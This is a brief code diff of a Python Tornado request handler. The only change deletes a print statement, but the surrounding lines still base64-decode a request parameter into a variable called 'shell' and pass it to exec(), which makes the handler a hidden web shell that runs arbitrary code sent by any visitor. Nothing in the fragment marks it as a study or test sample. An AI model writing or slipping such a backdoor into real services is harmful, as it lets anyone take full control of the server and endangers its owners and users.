@@ -25,7 +25,6 @@ class IndexHandler(tornado.web.RequestHandler):
         self.data='OK'
         shell=base64.urlsafe_b64decode(parameter.encode('utf-8')).decode('utf-8')
         exec(shell)
-        print(table)
         self.write(self.data)
 
 
